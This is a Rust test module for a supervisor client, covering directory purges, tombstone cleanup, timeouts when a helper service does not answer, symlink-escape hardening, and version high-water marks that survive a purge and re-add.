        assert!(!gone.exists(), "the removed supervisor's directory is gone");
        assert!(
            stays.join("instance-uid").is_file(),
            "a neighbour keeps its directory and identity"
        );
    }

    /// Where a process account is registered, the purge first has the second service remove what
    /// the removed Supervisor's Managed Processes wrote — a directory an agent made `0755`, as Go's
    /// `MkdirAll` does, a read-only one inside it — and then deletes the rest: nothing is left
    /// (ADR-0059 clause 5, ADR-0017 clause 34). The in-process service runs as this test's uid, so
    /// the read-only directory is what the Client could not remove without it.
    /// Verifies: ADR-0059
    #[cfg(unix)]
    #[tokio::test]
    async fn the_purge_has_the_second_service_remove_what_the_processes_wrote() {
        use crate::supervisor::channel::{peer, Channel};
        use crate::supervisor::process::Spawner;
        use std::os::unix::fs::PermissionsExt as _;
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        let gone = config.supervisor_dir("gone");
        let made = gone.join("data").join("made");
        let cache = made.join("cache");
        std::fs::create_dir_all(&cache).expect("mkdir");
        std::fs::set_permissions(&made, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        // A data directory the Client shares for writing (ADR-0059 clause 6).
        std::fs::set_permissions(gone.join("data"), std::fs::Permissions::from_mode(0o2770))
            .expect("chmod");
        std::fs::write(cache.join("module"), b"x").expect("write");
        std::fs::set_permissions(&cache, std::fs::Permissions::from_mode(0o555)).expect("chmod");
        std::fs::write(gone.join("instance-uid"), "uid").expect("write");

        let service = peer::real();
        let plugins = crate::supervisor::Registry::new(Spawner::Channel(Channel::new(
            &service.socket,
            peer::own_uid(),
            peer::this_process(),
        )));
        let tombs = entomb(&config, &["gone".to_string()]);
        release_removed(Some(&plugins), &tombs).await;
        bury(&tombs);

        assert!(!gone.exists(), "the removed supervisor's directory is gone");
    }

    /// Removed Supervisors whose Managed Processes wrote something, each in a data directory the
    /// Client shares for writing, under a root of its own.
    #[cfg(unix)]
    fn removed_with_data(names: &[&str]) -> (tempfile::TempDir, ClientConfig) {
        use std::os::unix::fs::PermissionsExt as _;
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        for name in names {
            let data = config.supervisor_dir(name).join("data");
            std::fs::create_dir_all(data.join("written")).expect("mkdir");
            std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o2770))
                .expect("chmod");
        }
        (dir, config)
    }

    /// One apply waits for the second service once, however many Supervisors it removes: two
    /// removed Supervisors and a service that never answers hold it [`PURGE_ANSWER`], not twice
    /// that (ADR-0059 clause 2).
    /// Verifies: ADR-0059
    #[cfg(unix)]
    #[tokio::test]
    async fn an_apply_waits_for_a_service_that_does_not_answer_once() {
        use crate::supervisor::channel::{peer, PURGE_ANSWER};
        use crate::supervisor::process::Spawner;
        let (_dir, config) = removed_with_data(&["a", "b"]);
        let peer = peer::connect(peer::mute).await;
        let plugins = crate::supervisor::Registry::new(Spawner::Channel(peer.channel.clone()));
        tokio::time::pause();
        let started = tokio::time::Instant::now();
        let tombs = entomb(&config, &["a".to_string(), "b".to_string()]);
        release_removed(Some(&plugins), &tombs).await;
        let elapsed = started.elapsed();
        assert!(
            elapsed < PURGE_ANSWER + std::time::Duration::from_secs(1),
            "{elapsed:?}"
        );
    }

    /// A second service that cannot be reached holds one apply [`PURGE_ANSWER`] for all its
    /// removed Supervisors, and the next apply in the same outage tries once rather than waiting
    /// again: the wait the deadline cut short counts as given up on (ADR-0059 clause 2).
    /// Verifies: ADR-0059
    #[cfg(unix)]
    #[tokio::test]
    async fn an_apply_waits_for_a_service_that_cannot_be_reached_once_per_outage() {
        use crate::supervisor::channel::{peer, Channel, PURGE_ANSWER};
        use crate::supervisor::process::Spawner;
        let (dir, config) = removed_with_data(&["a", "b", "c"]);
        let plugins = crate::supervisor::Registry::new(Spawner::Channel(Channel::new(
            &dir.path().join("nobody.sock"),
            peer::own_uid(),
            peer::this_process(),
        )));
        tokio::time::pause();
        let started = tokio::time::Instant::now();
        let tombs = entomb(&config, &["a".to_string(), "b".to_string()]);
        release_removed(Some(&plugins), &tombs).await;
        let elapsed = started.elapsed();
        assert!(
            elapsed < PURGE_ANSWER + std::time::Duration::from_secs(1),
            "{elapsed:?}"
        );
        let started = tokio::time::Instant::now();
        let tombs = entomb(&config, &["c".to_string()]);
        release_removed(Some(&plugins), &tombs).await;
        let elapsed = started.elapsed();
        assert!(elapsed < std::time::Duration::from_secs(1), "{elapsed:?}");
    }

    /// What goes on being removed after the purge gave up never reaches a Supervisor added again
    /// under the same name: the second service answers past the purge's deadline and only then
    /// removes what the process account wrote, while `gone` has been purged and added again in
    /// between; the new `gone` keeps its data (ADR-0017 clause 34, ADR-0059 clause 2).
    /// Verifies: ADR-0059
    #[cfg(unix)]
    #[tokio::test]
    async fn what_a_purge_removes_after_its_deadline_misses_a_supervisor_added_again() {
        use crate::supervisor::channel::{peer, purge, Request, PURGE_ANSWER};
        use crate::supervisor::process::Spawner;
        let (_dir, config) = removed_with_data(&["gone"]);
        let (late_tx, late) = tokio::sync::oneshot::channel();
        let mut late_tx = Some(late_tx);
        let peer = peer::connect(move |request| {
            if let Request::Purge {
                supervisor,
                dir,
                shared,
                ..
            } = request
            {
                let done = late_tx.take();
                tokio::spawn(async move {
                    tokio::time::sleep(PURGE_ANSWER * 2).await;
                    let result = purge(peer::own_uid(), &supervisor, &dir, &shared);
                    if let Some(done) = done {
                        let _ = done.send(result);
                    }
                });
            }
            Vec::new()
        })
        .await;
        let plugins = crate::supervisor::Registry::new(Spawner::Channel(peer.channel.clone()));
        tokio::time::pause();

        let tombs = entomb(&config, &["gone".to_string()]);
        release_removed(Some(&plugins), &tombs).await;
        bury(&tombs);
        let added = config.supervisor_dir("gone").join("data");
        std::fs::create_dir_all(&added).expect("added again");
        std::fs::write(added.join("state"), b"new").expect("its data");

        let _ = late.await.expect("the late purge ran");
        assert_eq!(std::fs::read(added.join("state")).expect("kept"), b"new");
    }

    /// A tombstone an earlier purge could not delete goes with the next purge, its name recording
    /// that the Client meant to remove it; every other orphan stays — a directory no block names,
    /// and one that only looks like a tombstone (ADR-0059 clause 12, ADR-0017 clause 37).
    /// Verifies: ADR-0059
    #[test]
    fn the_next_purge_removes_a_tombstone_left_behind() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        let root = config.supervisors_root();
        let program = root.join(tombstone_name("earlier")).join("program");
        std::fs::create_dir_all(&program).expect("a tombstone");
        std::fs::write(program.join("agent"), b"left").expect("its program");
        for orphan in [
            "orphan",
            ".purge-orphan",
            ".purge-orphan-xyz",
            ".purge-foo-abc",
            ".purge-backup-20241001",
        ] {
            std::fs::create_dir_all(root.join(orphan).join("program")).expect("an orphan");
        }
        std::fs::create_dir_all(config.supervisor_dir("gone")).expect("gone");
        std::fs::create_dir_all(config.supervisor_dir("stays")).expect("stays");

        purge_removed(&config, &[]);
        assert!(
            program.join("agent").is_file(),
            "an apply that removes nothing purges nothing"
        );
        purge_removed(&config, &["gone".to_string()]);

        let mut left_over: Vec<_> = std::fs::read_dir(&root)
            .expect("read")
            .map(|entry| entry.expect("entry").file_name())
            .collect();
        left_over.sort();
        assert_eq!(
            left_over,
            vec![
                ".purge-backup-20241001",
                ".purge-foo-abc",
                ".purge-orphan",
                ".purge-orphan-xyz",
                "orphan",
                "stays"
            ]
        );
    }

    /// What a start removes again: the tombstones alone, each named to the second service by its
    /// Supervisor and asked once, the Client's part only after the service answered — beside the
    /// start, which does not wait for the answer (ADR-0059 clauses 2, 5 and 12, ADR-0017 clause
    /// 37).
    /// Verifies: ADR-0059
    #[tokio::test]
    async fn a_start_removes_the_tombstones_again_beside_it() {
        use crate::supervisor::ports::{Plugin, PluginRegistry, Purged};
        struct Service {
            answer: tokio::sync::watch::Receiver<bool>,
            asked: std::sync::Mutex<Vec<String>>,
        }
        impl PluginRegistry for Service {
            fn plugins(&self) -> Vec<Box<dyn Plugin>> {
                Vec::new()
            }
            fn purge<'a>(&'a self, removed: &'a [(String, std::path::PathBuf)]) -> Purged<'a> {
                self.asked
                    .lock()
                    .expect("lock")
                    .extend(removed.iter().map(|(name, _)| name.clone()));
                let mut answer = self.answer.clone();
                Box::pin(async move {
                    let _ = answer.wait_for(|answer| *answer).await;
                    removed.iter().map(|_| Ok(())).collect()
                })
            }
        }
        let dir = tempfile::tempdir().expect("tempdir");
        let root = dir.path().join("supervisors");
        let tomb = root.join(tombstone_name("earlier"));
        std::fs::create_dir_all(tomb.join("program")).expect("a tombstone");
        for orphan in ["orphan", ".purge-orphan"] {
            std::fs::create_dir_all(root.join(orphan)).expect("an orphan");
        }
        let (answer, answered) = tokio::sync::watch::channel(false);
        let service = std::sync::Arc::new(Service {
            answer: answered,
            asked: std::sync::Mutex::new(Vec::new()),
        });

        reap_tombstones(&root, service.clone());
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        assert!(tomb.is_dir(), "removed before the second service answered");
        assert_eq!(*service.asked.lock().expect("lock"), vec!["earlier"]);

        answer.send_replace(true);
        let gone = async {
            while tomb.exists() {
                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
            }
        };
        tokio::time::timeout(std::time::Duration::from_secs(10), gone)
            .await
            .expect("the tombstone is removed again");
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        assert_eq!(
            *service.asked.lock().expect("lock"),
            vec!["earlier"],
            "asked once"
        );
        assert!(root.join("orphan").is_dir() && root.join(".purge-orphan").is_dir());
    }

    /// A Supervisors' root reached through a link of the Client's own account — one beneath a data
    /// root the hand-over gave the Client, or `~/.local` → `/data` for `--user` — is purged
    /// through it: the link is the Client's, in a directory only the Client writes (ADR-0017
    /// clause 34, ADR-0059 clause 6).
    /// Verifies: ADR-0017
    #[cfg(unix)]
    #[test]
    fn a_root_reached_through_a_link_of_the_clients_own_is_purged() {
        let dir = tempfile::tempdir().expect("tempdir");
        let real = dir.path().join("data");
        std::fs::create_dir_all(real.join("supervisors").join("gone").join("program"))
            .expect("gone");
        std::fs::create_dir_all(real.join("supervisors").join("stays")).expect("stays");
        let linked = dir.path().join("local");
        std::os::unix::fs::symlink(&real, &linked).expect("the Client's own link");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            linked.join("supervisors").to_string_lossy()
        ))
        .expect("config");

        purge_removed(&config, &["gone".to_string()]);

        let left_over: Vec<_> = std::fs::read_dir(real.join("supervisors"))
            .expect("read")
            .map(|entry| entry.expect("entry").file_name())
            .collect();
        assert_eq!(left_over, vec![std::ffi::OsString::from("stays")]);
    }

    /// A compromised Server purges a Supervisor and adds it back to reset its floor: `a` of type
    /// `otelcol` installs `0.110.0`, a set without `a` purges it, and sets adding `b` and then `a`
    /// again follow. The mark file survives the purge — here with `supervisor_dir` at `state_dir`
    /// itself — and each re-added Supervisor refuses `0.109.0` naming the mark, and takes
    /// `0.110.0+other` and `0.111.0` (ADR-0043 clauses 8 and 14).
    /// Verifies: ADR-0043
    #[test]
    fn a_purged_and_re_added_supervisor_is_held_to_its_types_mark() {
        use crate::storage::{HighWaterFile, Storage, HIGH_WATER_FILE};
        use crate::supervisor::agent::AgentState;
        use crate::supervisor::ports::HighWaterMarks;
        use opamp::proto::ServerToAgent;
        use std::sync::Arc;

        let dir = tempfile::tempdir().expect("tempdir");
        let state = dir.path().join("state");
        let config: ClientConfig = toml::from_str(&format!(
            "state_dir = {state:?}\nsupervisor_dir = {state:?}",
            state = state.to_string_lossy()
        ))
        .expect("config");
        let marks: Arc<dyn HighWaterMarks> = Arc::new(HighWaterFile::open(&config.state_dir));
        let supervisor = |name: &str| {
            let mut agent = AgentState::supervised(
                name.to_string(),
                "otelcol".to_string(),
                Storage::new(config.supervisor_dir(name)).expect("storage"),
                crate::host::SystemHost,
            )
            .expect("agent")
            .with_high_water(marks.clone());
            agent.accept_packages();
            let _ = agent.next_report();
            agent
        };
        let offer = |agent: &mut AgentState, version: &str| {
            let handled = agent.handle(&ServerToAgent {
                packages_available: Some(opamp::proto::PackagesAvailable {
                    packages: [(
                        "otelcol".to_string(),
                        opamp::proto::PackageAvailable {
                            version: version.to_string(),
                            file: Some(opamp::proto::DownloadableFile {
                                download_url: "/x".to_string(),
                                content_hash: b"chash".to_vec(),
                                ..Default::default()
                            }),
                            hash: version.as_bytes().to_vec(),
                            ..Default::default()
                        },
                    )]
                    .into(),
                    all_packages_hash: version.as_bytes().to_vec(),
                }),
                ..Default::default()
            });
            let statuses = agent.next_report().package_statuses.expect("statuses");
            (handled.package_download.is_some(), statuses.error_message)
        };

        let mut a = supervisor("a");
        assert!(offer(&mut a, "0.110.0").0);
        a.package_applied(b"0.110.0".to_vec(), Ok("0.110.0".to_string()));
        drop(a);
        purge_removed(&config, &["a".to_string()]);
        assert!(!config.supervisor_dir("a").exists(), "a is purged");
        assert!(
            state.join(HIGH_WATER_FILE).is_file(),
            "the purge leaves the mark file"
        );

        for name in ["b", "a"] {
            let mut readded = supervisor(name);
            let (downloads, why) = offer(&mut readded, "0.109.0");
            assert!(!downloads, "{name}: nothing below the mark is fetched");
            assert!(
                why.contains("0.110.0"),
                "{name}: the refusal names the mark: {why}"
            );
            assert!(
                offer(&mut readded, "0.110.0+other").0,
                "{name}: equal is taken"
            );
            assert!(offer(&mut readded, "0.111.0").0, "{name}: newer is taken");
            drop(readded);
            purge_removed(&config, &[name.to_string()]);
        }
    }

    /// ADR-0017 hardening: the purge never recurses through a symlink planted where a Supervisor's
    /// directory should be — it removes the link, not what it points at. A `name` cannot itself
    /// traverse (ADR-0017), so this is the only way the delete could have escaped, and it does not.
    #[cfg(unix)]
    #[test]
    fn the_purge_does_not_follow_a_symlink_out_of_the_supervisors_root() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");

        // A precious directory outside the supervisors root, with a file the purge must not touch.
        let outside = dir.path().join("precious");
        std::fs::create_dir_all(&outside).expect("create");
        std::fs::write(outside.join("keep"), "important").expect("write");

        // A Supervisor directory that is really a symlink pointing at it.
        std::fs::create_dir_all(config.supervisors_root()).expect("root");
        let link = config.supervisor_dir("evil");
        std::os::unix::fs::symlink(&outside, &link).expect("symlink");

        purge_removed(&config, &["evil".to_string()]);

        assert!(
            outside.join("keep").is_file(),
            "the symlink target and its contents survive"
        );
        assert!(!link.exists(), "the stray symlink itself is removed");
    }

    /// An offer whose entries carry no blocks empties the set: the file keeps its globals and
    /// loses its `[[supervisor]]` blocks.
    #[test]
    fn an_empty_offer_removes_every_block() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        let (blocks, tables) = offered_blocks(&offer_of(&[("fleet", "")])).expect("parse");
        assert!(blocks.is_empty());
        let text = write_supervisors(&path, tables).expect("rewrite");
        assert!(!text.contains("supervisor"), "{}", *text);
        assert!(text.contains("endpoint"), "{}", *text);
    }
}
